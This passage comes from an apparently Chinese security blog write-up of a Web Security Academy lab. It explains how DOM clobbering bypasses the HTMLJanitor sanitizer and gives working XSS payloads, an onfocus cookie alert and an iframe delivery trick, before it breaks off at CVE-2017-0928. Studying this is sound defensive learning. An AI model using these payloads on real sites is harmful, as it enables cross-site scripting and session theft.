class="hljs-attr">p</span>:{}}});</span><br></pre></td></tr></table></figure><p>&#x4E00;&#x5F00;&#x59CB;&#x5C31;&#x521D;&#x59CB;&#x5316;&#x4E86;<code>HTMLJanitor</code>&#xFF0C;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x521D;&#x59CB;&#x5316;&#x5185;&#x7684;&#x6807;&#x7B7E;&#x53CA;&#x5176;&#x5C5E;&#x6027;&#xFF0C;&#x5BF9;&#x4E8E;&#x91CD;&#x8981;&#x7684;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x5730;&#x65B9;&#x90FD;&#x4F7F;&#x7528;&#x4E86;<code>janitor.clean</code>&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x3002;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x6CA1;&#x529E;&#x6CD5;&#x5F88;&#x7B80;&#x5355;&#x5730;&#x8FDB;&#x884C; XSS &#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x5C31;&#x53EA;&#x80FD;&#x6765;&#x770B;&#x770B;<code>resources/js/htmlJanitor.js</code>&#x8FD9;&#x4E2A;&#x8FC7;&#x6EE4;&#x6587;&#x4EF6;&#x4E86;&#x3002;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTMLJanitor.prototype.clean = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">html</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">const</span> sandbox = <span class="hljs-built_in">document</span>.implementation.createHTMLDocument(<span class="hljs-string">&quot;&quot;</span>);</span><br><span class="line">  <span class="hljs-keyword">const</span> root = sandbox.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line">  root.innerHTML = html;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(sandbox, root);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> root.innerHTML;</span><br><span class="line">};</span><br></pre></td></tr></table></figure><p>&#x9996;&#x5148;&#x7528;<code>document.implementation.createHTMLDocument</code>&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x65B0;&#x7684; HTML &#x6587;&#x6863;&#x7528;&#x4F5C; sandbox &#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x4E8E; sandbox &#x5185;&#x7684;&#x5143;&#x7D20;&#x8FDB;&#x884C;<code>_sanitize</code>&#x8FC7;&#x6EE4;&#x3002;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTMLJanitor.prototype._sanitize = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">document, parentNode</span>) </span>{</span><br><span class="line">truetrue<span class="hljs-keyword">var</span> treeWalker = createTreeWalker(<span class="hljs-built_in">document</span>, parentNode);</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>&#x5728;<code>_sanitize</code>&#x51FD;&#x6570;&#x4E00;&#x5F00;&#x59CB;&#x8C03;&#x7528;&#x4E86;<code>createTreeWalker</code>&#x51FD;&#x6570;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;<code>TreeWalker</code>&#xFF0C;&#x8FD9;&#x4E2A;&#x7C7B;&#x8868;&#x793A;&#x4E00;&#x4E2A;&#x5F53;&#x524D;&#x6587;&#x6863;&#x7684;&#x5B50;&#x6811;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x8282;&#x70B9;&#x53CA;&#x5176;&#x4F4D;&#x7F6E;&#x3002;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createTreeWalker</span>(<span class="hljs-params">document, node</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">document</span>.createTreeWalker(</span><br><span class="line">    node,</span><br><span class="line">    NodeFilter.SHOW_TEXT |</span><br><span class="line">    NodeFilter.SHOW_ELEMENT |</span><br><span class="line">    NodeFilter.SHOW_COMMENT,</span><br><span class="line">    <span class="hljs-literal">null</span>,</span><br><span class="line">    <span class="hljs-literal">false</span></span><br><span class="line">  );</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x91CC;&#x7684;<code>node</code>&#x5373;&#x4E3A;&#x4E00;&#x5F00;&#x59CB;&#x7684;<code>root</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684;<code>html</code>&#x4F1A;&#x5728;&#x4F20;&#x5165;&#x5230;<code>node</code>&#x53C2;&#x6570;&#xFF0C;<code>document</code>&#x5373;&#x4E3A;&#x4E00;&#x5F00;&#x59CB;&#x7684;<code>sandbox</code>&#xFF0C;&#x63A5;&#x7740;&#x8FDB;&#x5165;&#x5FAA;&#x73AF;&#x8FDB;&#x884C;&#x5224;&#x65AD;&#xFF0C;&#x5BF9;&#x4E8E;&#x6587;&#x672C;&#x5462;&#x7ED2;&#x4EE5;&#x53CA;&#x6CE8;&#x91CA;&#x8FDB;&#x884C;&#x5904;&#x7406;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (node.nodeType === Node.TEXT_NODE) {</span><br><span class="line">true<span class="hljs-comment">//&#x5982;&#x679C;&#x6B64;&#x6587;&#x672C;&#x8282;&#x70B9;&#x53EA;&#x662F;&#x7A7A;&#x767D;&#xFF0C;&#x5E76;&#x4E14;&#x4E0A;&#x4E00;&#x4E2A;&#x6216;&#x4E0B;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x540C;&#x7EA7;&#x662F;`blockElement`&#xFF0C;&#x5219;&#x5C06;&#x5176;&#x5220;&#x9664;</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">// &#x79FB;&#x9664;&#x6240;&#x6709;&#x7684;&#x6CE8;&#x91CA;</span></span><br><span class="line"><span class="hljs-keyword">if</span> (node.nodeType === Node.COMMENT_NODE) {</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//&#x68C0;&#x67E5;`inlineElement`&#x4E2D;&#x662F;&#x5426;&#x8FD8;&#x6709;`BlockElement`</span></span><br><span class="line"><span class="hljs-keyword">var</span> isInline = isInlineElement(node);</span><br><span class="line"><span class="hljs-keyword">var</span> containsBlockElement;</span><br><span class="line"><span class="hljs-keyword">if</span> (isInline) {</span><br><span class="line">  containsBlockElement = <span class="hljs-built_in">Array</span>.prototype.some.call(</span><br><span class="line">    node.childNodes,</span><br><span class="line">    isBlockElement</span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//&#x68C0;&#x67E5;`BlockElement`&#x662F;&#x5426;&#x5D4C;&#x5957;</span></span><br><span class="line"><span class="hljs-keyword">var</span> isNotTopContainer = !!parentNode.parentNode;</span><br><span class="line"><span class="hljs-keyword">var</span> isNestedBlockElement =</span><br><span class="line">    isBlockElement(parentNode) &amp;&amp;</span><br><span class="line">    isBlockElement(node) &amp;&amp;</span><br><span class="line">    isNotTopContainer;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> nodeName = node.nodeName.toLowerCase();</span><br><span class="line"><span class="hljs-comment">//&#x83B7;&#x53D6;&#x5141;&#x8BB8;&#x4F7F;&#x7528;&#x7684;&#x5C5E;&#x6027;</span></span><br><span class="line"><span class="hljs-keyword">var</span> allowedAttrs = getAllowedAttrs(<span class="hljs-keyword">this</span>.config, nodeName, node);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> isInvalid = isInline &amp;&amp; containsBlockElement;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//&#x6839;&#x636E;&#x767D;&#x540D;&#x5355;&#x5220;&#x9664;&#x6807;&#x7B7E;</span></span><br><span class="line"><span class="hljs-keyword">if</span> (</span><br><span class="line">  isInvalid ||</span><br><span class="line">  shouldRejectNode(node, allowedAttrs) ||</span><br><span class="line">  (!<span class="hljs-keyword">this</span>.config.keepNestedBlockElements &amp;&amp; isNestedBlockElement)</span><br><span class="line">) {</span><br><span class="line">  <span class="hljs-comment">// Do not keep the inner text of SCRIPT/STYLE elements.</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (</span><br><span class="line">    !(node.nodeName === <span class="hljs-string">&quot;SCRIPT&quot;</span> || node.nodeName === <span class="hljs-string">&quot;STYLE&quot;</span>)</span><br><span class="line">  ) {</span><br><span class="line">    <span class="hljs-keyword">while</span> (node.childNodes.length &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">      parentNode.insertBefore(node.childNodes[<span class="hljs-number">0</span>], node);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  parentNode.removeChild(node);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(<span class="hljs-built_in">document</span>, parentNode);</span><br><span class="line">  <span class="hljs-keyword">break</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>&#x6700;&#x540E;&#x770B;&#x5230;&#x503C;&#x5F97;&#x6211;&#x4EEC;&#x5173;&#x6CE8;&#x7684;&#x70B9;&#xFF1A;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Sanitize attributes</span></span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a += <span class="hljs-number">1</span>) {</span><br><span class="line">  <span class="hljs-keyword">var</span> attr = node.attributes[a];</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (shouldRejectAttr(attr, allowedAttrs, node)) {</span><br><span class="line">    node.removeAttribute(attr.name);</span><br><span class="line">    <span class="hljs-comment">// Shift the array to continue looping.</span></span><br><span class="line">    a = a - <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Sanitize children</span></span><br><span class="line"><span class="hljs-keyword">this</span>._sanitize(<span class="hljs-built_in">document</span>, node);</span><br></pre></td></tr></table></figure><p>&#x5728;&#x8FD9;&#x91CC;&#x6700;&#x7EC8;&#x5BF9;&#x6807;&#x7B7E;&#x7684;&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x4E86; check &#xFF0C;&#x5BF9; node &#x7684;&#x6BCF;&#x4E2A;&#x5C5E;&#x6027;&#x90FD;&#x8FDB;&#x884C;&#x4E86;&#x767D;&#x540D;&#x5355;&#x68C0;&#x67E5;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shouldRejectAttr</span>(<span class="hljs-params">attr, allowedAttrs, node</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">var</span> attrName = attr.name.toLowerCase();</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (allowedAttrs === <span class="hljs-literal">true</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">&quot;function&quot;</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> !allowedAttrs[attrName](attr.value, node);</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">&quot;undefined&quot;</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (allowedAttrs[attrName] === <span class="hljs-literal">false</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">&quot;string&quot;</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> allowedAttrs[attrName] !== attr.value;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>&#x5982;&#x679C;&#x53D1;&#x73B0;&#x6709;&#x4E0D;&#x5728;&#x767D;&#x540D;&#x5355;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;<code>node.removeAttribute(attr.name);</code>&#x8FDB;&#x884C;&#x5220;&#x9664;&#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x5B50;&#x8282;&#x70B9;&#x8FDB;&#x884C;&#x9012;&#x5F52;<code>_sanitize</code>&#x3002;&#x6240;&#x4EE5;&#x6709;&#x4E24;&#x4E2A;&#x601D;&#x8DEF;&#xFF0C;&#x8981;&#x4E48;&#x7ED5;&#x6807;&#x7B7E;&#x8FC7;&#x6EE4;&#xFF0C;&#x8981;&#x4E48;&#x7ED5;&#x8282;&#x70B9;&#x5C5E;&#x6027;&#x8FC7;&#x6EE4;&#x3002;</p><p>&#x6807;&#x7B7E;&#x7684;&#x83B7;&#x53D6;&#x7531;<code>treeWalker.firstChild();</code>&#x5F97;&#x5230;&#xFF0C;&#x8FC7;&#x6EE4;&#x7531;<code>getAllowedAttrs</code>&#x4EE5;&#x53CA;<code>shouldRejectNode</code>&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#xFF0C;&#x7531;&#x4E8E;&#x8FD9;&#x91CC;&#x7684;&#x8FC7;&#x6EE4;&#x662F;&#x8FDB;&#x884C;&#x767D;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#xFF0C;&#x6CA1;&#x4EC0;&#x4E48;&#x529E;&#x6CD5;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF1B;&#x5C5E;&#x6027;&#x7684;&#x83B7;&#x53D6;&#x5728;&#x4E00;&#x4E2A;<code>for</code>&#x5FAA;&#x73AF;&#x5F53;&#x4E2D;&#xFF0C;&#x6761;&#x4EF6;&#x662F;<code>node.attributes.length</code>&#xFF0C;&#x83B7;&#x53D6;&#x65B9;&#x5F0F;&#x662F;<code>node.attributes[a]</code>&#xFF0C;&#x8FC7;&#x6EE4;&#x7531;<code>shouldRejectAttr</code>&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x3002;</p><p>&#x5BF9; Dom Clobbering &#x6BD4;&#x8F83;&#x654F;&#x611F;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x80FD;&#x4F1A;&#x6CE8;&#x610F;&#x5230;&#x8FD9;&#x91CC;&#xFF0C;&#x5BF9;&#x4E8E; node &#x5C5E;&#x6027;&#x8FC7;&#x6EE4;&#x65F6;&#x7684;<code>for</code>&#x5FAA;&#x73AF;&#x6761;&#x4EF6;&#xFF0C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x4E86;<code>node.attributes.length</code>&#xFF0C;&#x5018;&#x82E5;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684;&#x8282;&#x70B9;&#x6B63;&#x597D;&#x6709;&#x4E00;&#x4E2A;<code>attributes</code>&#x5B50;&#x8282;&#x70B9;&#x4F1A;&#x600E;&#x4E48;&#x6837;&#x5462;&#xFF1F;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">img</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> node = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(node.attributes);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a++) {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(node.attributes[a]);</span></span><br><span class="line">  }</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&apos;finished&apos;</span>);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x4EE5;&#x4E0A;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4F1A;&#x8F93;&#x51FA;&#x4E00;&#x4E2A;<code>NamedNodeMap</code>&#x5BF9;&#x8C61;&#xFF0C;<code>id=&apos;x&apos;</code>&#x4EE5;&#x53CA; finished</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">name</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> node = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(node.attributes);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a++) {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(node.attributes[a]);</span></span><br><span class="line">  }</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&apos;finished&apos;</span>);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x4EE5;&#x4E0A;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4F1A;&#x8F93;&#x51FA;<code>&lt;img name=attributes&gt;</code>&#x4EE5;&#x53CA; finished &#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6211;&#x4EEC;&#x4F7F;&#x7528;<code>name=attributes</code>&#x6210;&#x529F;&#x5730;&#x8986;&#x76D6;&#x4E86;&#x539F;&#x6765;&#x7684;<code>node.attributes</code>&#xFF0C;&#x6240;&#x4EE5;<code>node.attributes.length</code>&#x5728;&#x8FD9;&#x91CC;&#x7684;&#x503C;&#x4E3A;<code>undefined</code>&#xFF0C;&#x5E76;&#x4E14;&#x4E5F;&#x6CA1;&#x6709;&#x5F71;&#x54CD; JS &#x4EE3;&#x7801;&#x7684;&#x7EE7;&#x7EED;&#x8FD0;&#x884C;&#x3002;</p><p>&#x6240;&#x4EE5;&#x660E;&#x767D;&#x4E86;&#x8FD9;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x6709;<code>name=attributes</code>&#x7684;&#x5B50;&#x8282;&#x70B9;&#x7684; payload &#x7ED5;&#x8FC7;&#x5C5E;&#x6027;&#x7684; check &#xFF0C;&#x8FD9;&#x91CC;&#x7ED9;&#x5B9A;&#x7684;&#x767D;&#x540D;&#x5355;&#x6807;&#x7B7E;&#x4E5F;&#x6BD4;&#x8F83;&#x660E;&#x663E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; HTML Relationships &#x6765;&#x6784;&#x9020;&#x6211;&#x4EEC;&#x7684; payload</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x63A5;&#x7740;&#x5C31;&#x662F;&#x6784;&#x9020; XSS &#x4E86;&#xFF0C;&#x6839;&#x636E;&#x9898;&#x76EE;&#x8981;&#x6C42;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x89E6;&#x53D1;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>tabindex</code>&#x5C5E;&#x6027;&#xFF0C;&#x914D;&#x5408;<code>form</code>&#x7684;<code>onfocus</code>&#x65F6;&#x95F4;&#x6765; XSS &#x3002;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">0</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x628A;&#x5B83;&#x5F53;&#x4F5C;&#x8BC4;&#x8BBA;&#x63D0;&#x4EA4;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227152312.png" alt></p><p>&#x4F46;&#x662F;&#x5982;&#x679C;&#x76F4;&#x63A5;&#x4EA4;&#x7ED9;&#x7528;&#x6237;&#x70B9;&#x51FB;&#x7684;&#x8BDD;&#x662F;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x8BC4;&#x8BBA;&#x662F;&#x7531; aJax &#x8BF7;&#x6C42;&#x62FF;&#x5230;&#x7684;&#xFF0C;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x7684;&#x8BDD;&#xFF0C;Dom &#x6811;&#x662F;&#x8FD8;&#x6CA1;&#x6709;&#x8BC4;&#x8BBA;&#x7684;&#xFF0C;&#x5F97;&#x9700;&#x8981;&#x7B49;&#x5F85; JS &#x6267;&#x884C;&#x5B8C;&#x6210;&#x624D;&#x4F1A;&#x6709;&#x8BC4;&#x8BBA;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x5EF6;&#x65F6;&#x6216;&#x8005;&#x963B;&#x585E;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x662F;&#x5229;&#x7528;<code>iframe</code>&#x8FDB;&#x884C;<code>setTimeout</code></p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">https://your-lab-id.web-security-academy.net/post?postId</span>=<span class="hljs-string">3</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;setTimeout(a=&gt;this.src=this.src+&apos;#x&apos;,500)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x91CC;&#x8981;&#x6CE8;&#x610F;&#x4E00;&#x5B9A;&#x8981;&#x5F97;&#x7B49;&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#x518D;&#x7528;<code>#x</code>&#x9009;&#x62E9;<code>form</code>&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684; 500ms &#x9700;&#x8981;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x7684;&#x7F51;&#x7EDC;&#x60C5;&#x51B5;&#x9002;&#x5F53;&#x8C03;&#x6574;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227153949.png" alt></p><h3 id="CVE-2017-0928-Bypassing-sanitization-using-DOM-clobbering"><a href="#CVE-2017-0928-Bypassing-sanitization-using-DOM-clobbering" class="headerlink" title="CVE-2017-0928 Bypassing sanitization using DOM clobbering"></a>CVE-2017-0928 Bypassing sanitization using DOM clobbering</h3><p><a href="https://github.com/guardian/html-janitor/" target="_blank" rel="noopener">html-janitor</a> &#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4E0A;&#x6587;&#x7528;&#x5230;&#x7684; HTML filters&#xFF0C;&#x5728; v2.0.2 &#x5F53;&#x4E2D;&#xFF0C;janitor &#x5728;&#x5FAA;&#x73AF;&#x4E2D;&#x6709;&#x8FD9;&#x4E48;&#x51E0;&#x884C;&#x4EE3;&#x7801;&#xFF1A;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">do</span> {</span><br><span class="line">  <span class="hljs-comment">// Ignore nodes that have already been sanitized</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (node._sanitized) {</span><br><span class="line">    <span class="hljs-keyword">continue</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">  <span class="hljs-comment">// Sanitize children</span></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(node);</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-comment">// Mark node as sanitized so it&apos;s ignored in future runs</span></span><br><span class="line">  node._sanitized = <span class="hljs-literal">true</span>;</span><br><span class="line">} <span class="hljs-keyword">while</span> ((node = 